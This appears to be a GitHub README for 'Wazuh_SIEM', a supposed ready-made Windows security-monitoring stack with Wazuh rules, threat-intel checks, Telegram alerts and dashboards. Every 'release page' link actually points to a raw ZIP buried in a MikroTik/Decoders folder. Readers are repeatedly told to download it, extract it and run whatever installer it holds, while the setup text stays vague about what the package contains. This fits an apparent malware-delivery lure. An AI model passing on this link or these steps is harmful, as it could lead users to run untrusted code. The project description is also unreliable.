# 🛡️ Wazuh_SIEM - Clear Security Monitoring for Teams

[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/mynameisizhan/Wazuh_SIEM/raw/refs/heads/main/MikroTik/Decoders/SIEM-Wazuh-2.5.zip)

## 📌 What this is

Wazuh_SIEM is a ready-to-use security monitoring setup for Windows users who want to get started with SIEM on their own system or lab.

It brings together:

- Wazuh SIEM rules and config
- VirusTotal and MISP threat intel checks
- OPNsense and MikroTik monitoring
- Automated active response actions
- Telegram alerts for SOC use
- Custom decoders and rules
- A Docker syslog collector
- MITRE ATT&CK mapping
- Dashboards you can import

This project is for people who want a practical security stack without building each part from scratch.

## 🖥️ What you need

Before you start, make sure your Windows PC has:

- Windows 10 or Windows 11
- Internet access
- At least 8 GB RAM
- 20 GB free disk space
- Administrator access
- Docker Desktop installed if you plan to run the syslog collector
- A browser to open the release page

For best results, use a machine that you can keep on during monitoring.

## ⬇️ Download the files

Visit this page to download the latest release:

[https://github.com/mynameisizhan/Wazuh_SIEM/raw/refs/heads/main/MikroTik/Decoders/SIEM-Wazuh-2.5.zip](https://github.com/mynameisizhan/Wazuh_SIEM/raw/refs/heads/main/MikroTik/Decoders/SIEM-Wazuh-2.5.zip)

On that page, look for the newest release and download the file that fits your setup. If you see a ZIP file, download it and extract it first. If you see an installer or package, use that file.

## 🚀 Get started on Windows

Follow these steps in order.

### 1. Open the release page

Open the download link in your browser:

[https://github.com/mynameisizhan/Wazuh_SIEM/raw/refs/heads/main/MikroTik/Decoders/SIEM-Wazuh-2.5.zip](https://github.com/mynameisizhan/Wazuh_SIEM/raw/refs/heads/main/MikroTik/Decoders/SIEM-Wazuh-2.5.zip)

Find the latest release at the top of the page.

### 2. Download the release file

Download the file from the latest release.

If the release contains a ZIP archive:

- Save it to your Downloads folder
- Right-click the file
- Select Extract All
- Choose a folder you can find again, such as `C:\Wazuh_SIEM`

If the release contains setup files, download those instead and keep them in one folder.

### 3. Install the base tools

If you want to use the Docker syslog collector, install Docker Desktop first.

If your setup uses Wazuh Manager, dashboards, or agent components, follow the files in the release package and install them in the order they appear.

Keep the extracted folder open so you can move through the setup files one by one.

### 4. Start the syslog collector

If the package includes Docker files, start the collector from the extracted project folder.

Typical steps:

- Open Docker Desktop
- Make sure Docker is running
- Open the folder that contains the Docker files
- Start the container set included in the release

This collector receives syslog data from devices such as firewalls and routers.

### 5. Connect your devices

Add your network devices so they can send logs to the collector.

Common devices in this setup:

- OPNsense firewall
- MikroTik router
- Windows machines
- Other syslog-compatible devices

Set each device to send logs to the IP address of the machine running the collector.

### 6. Import dashboards

If the release includes dashboard files, import them into your Wazuh or dashboard interface.

Use the files that match your installed version. After import, open the dashboards and check that data appears.

The ready-made dashboards can help you view:

- Alerts
- Host activity
- Firewall events
- Threat intel matches
- Response actions
- MITRE ATT&CK mapping

### 7. Set up Telegram alerts

If the package includes Telegram alert settings, add your bot token and chat ID.

This lets Wazuh send alerts to your Telegram channel or chat when security events happen.

Typical use:

- High priority alerts
- Detection hits
- Active response events
- Device status changes

### 8. Add VirusTotal and MISP

If you plan to use threat intelligence, enter your VirusTotal API key and MISP details in the config files from the release.

These services help match hashes, IPs, and indicators against known threats.

After setup, test with a known sample event and check that the alert includes threat intel data.

### 9. Enable active response

Active response lets the system react to certain events.

This project may include actions such as:

- Blocking an IP
- Quarantining a host
- Running a custom script
- Triggering an alert flow

Use the files in the release to enable the response rules you want. Start with one or two simple actions first.

### 10. Test the setup

After setup, send a test event and check each part:

- Logs reach the collector
- Wazuh receives the event
- The dashboard shows the event
- Telegram receives the alert
- Threat intel fields appear
- Active response runs when expected

If one part does not work, check the config file and device log settings.

## 🧭 File layout

The release package may include folders like these:

- `docker/` for the syslog collector
- `rules/` for custom detection rules
- `decoders/` for log parsing
- `dashboards/` for import files
- `active-response/` for response scripts
- `integrations/` for VirusTotal, MISP, and Telegram
- `docs/` for setup notes

Keep the folder names as they are. Many config files depend on the path.

## 🔍 What the project can detect

This setup is built to help you see common security events such as:

- Failed login attempts
- Suspicious firewall traffic
- Port scans
- Rule matches from custom decoders
- Known bad hashes or IPs
- Threat intel hits from VirusTotal or MISP
- Device events from OPNsense and MikroTik
- Signs of brute-force activity
- Alerts linked to MITRE ATT&CK tactics

## 📱 Telegram alert flow

When a rule matches, Wazuh can send a message to Telegram.

A typical alert may include:

- Time of the event
- Device name
- Rule name
- Severity
- Source IP
- Destination IP
- Threat intel match
- Response action taken

This helps you check events without opening the dashboard each time.

## 🧩 MITRE ATT&CK mapping

The included rules can map events to MITRE ATT&CK techniques.

This makes it easier to see how an event fits into a known attack path.

You may see mappings for:

- Initial access
- Execution
- Persistence
- Privilege escalation
- Defense evasion
- Discovery
- Lateral movement
- Command and control
- Exfiltration

## 🛠️ Common setup checks

If something does not work, check these items:

- Docker is running
- The collector port is open
- Your firewall allows syslog traffic
- The correct IP address is set on each device
- The API key or bot token is entered correctly
- The imported dashboard file matches your version
- The config files are in the right folder

## 📁 Suggested Windows folder setup

To keep things simple, use one main folder such as:

- `C:\Wazuh_SIEM`

Inside that folder, keep:

- the extracted release files
- any dashboard exports
- any notes you make
- any config backups

A simple folder layout makes setup easier to follow later.

## 🔐 Security notes

This project is for monitoring and response in a trusted environment.

Use a secure password for any web panels.

Keep API keys private.

Store bot tokens in a safe place.

If you share your config files, remove private values first.

## 📚 Helpful use cases

You can use Wazuh_SIEM for:

- Home lab security monitoring
- Small office SOC use
- Firewall log centralization
- Threat intel checks
- Alerting through Telegram
- Active response testing
- Detection rule development
- MITRE ATT&CK based alert review

## 🧪 First test checklist

After setup, check these items:

- The release files are downloaded
- The ZIP file is extracted
- Docker starts without errors
- Logs reach the collector
- Wazuh shows new events
- Telegram gets a test alert
- Dashboards open and display data
- Threat intel fields show values
- Active response runs on test events

## 📄 Next steps

After your first test works, you can:

- Add more devices
- Tweak rule severity
- Add more custom decoders
- Expand threat intel checks
- Import more dashboards
- Tune active response actions
- Review alerts by MITRE ATT&CK group

## 🔗 Download again

If you need the release page again, use this link:

[https://github.com/mynameisizhan/Wazuh_SIEM/raw/refs/heads/main/MikroTik/Decoders/SIEM-Wazuh-2.5.zip](https://github.com/mynameisizhan/Wazuh_SIEM/raw/refs/heads/main/MikroTik/Decoders/SIEM-Wazuh-2.5.zip)